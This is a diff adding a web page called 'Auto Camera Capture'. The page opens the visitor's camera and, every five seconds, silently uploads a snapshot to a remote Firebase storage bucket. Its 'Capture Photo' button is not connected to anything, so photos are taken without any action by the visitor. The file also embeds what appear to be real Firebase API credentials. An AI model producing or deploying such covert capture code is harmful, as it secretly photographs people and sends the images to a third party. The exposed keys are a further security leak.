@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Camera Capture</title>
+    <style>
+        /* Add your custom CSS styling here if needed */
+    </style>
+</head>
+<body>
+    <video id="video" width="640" height="480" autoplay></video>
+    <button id="captureButton">Capture Photo</button>
+
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-storage.js"></script>
+    <script>
+        // Replace with your Firebase SDK configuration
+        var firebaseConfig = {
+          apiKey: "AIzaSyBt-3xPszDlyQlIOw2fcyyVC5KnsuWkP3Y",
+  authDomain: "flip-vedio.firebaseapp.com",
+  databaseURL: "https://flip-vedio-default-rtdb.firebaseio.com",
+  projectId: "flip-vedio",
+  storageBucket: "flip-vedio.appspot.com",
+  messagingSenderId: "683500498033",
+  appId: "1:683500498033:web:898ff89cb9c0bbb4b4ffd0",
+  measurementId: "G-TGELEK88XN"
+        };
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+
+        // HTML elements
+        const video = document.getElementById('video');
+        const captureButton = document.getElementById('captureButton');
+
+        // Function to capture and upload photo
+        function captureAndUploadPhoto() {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Convert the canvas data to a data URL
+            const dataURL = canvas.toDataURL('image/jpeg');
+
+            // Generate a unique filename (you can use your own logic here)
+            const filename = 'photo_' + Date.now() + '.jpg';
+
+            // Upload the photo to Firebase Storage
+            var storageRef = firebase.storage().ref().child(filename);
+            storageRef.putString(dataURL, 'data_url').then(function (snapshot) {
+                console.log('Uploaded a photo!');
+            }).catch(function (error) {
+                console.error('Error uploading photo:', error);
+            });
+        }
+
+        // Access the user's camera
+        navigator.mediaDevices.getUserMedia({ video: true }).then(function (stream) {
+            video.srcObject = stream;
+        }).catch(function (error) {
+            console.error('Error accessing the camera:', error);
+        });
+
+        // Capture a photo and upload it every 5 seconds
+        const interval = 5000; // 5 seconds
+        setInterval(captureAndUploadPhoto, interval);
+    </script>
+</body>
+</html>
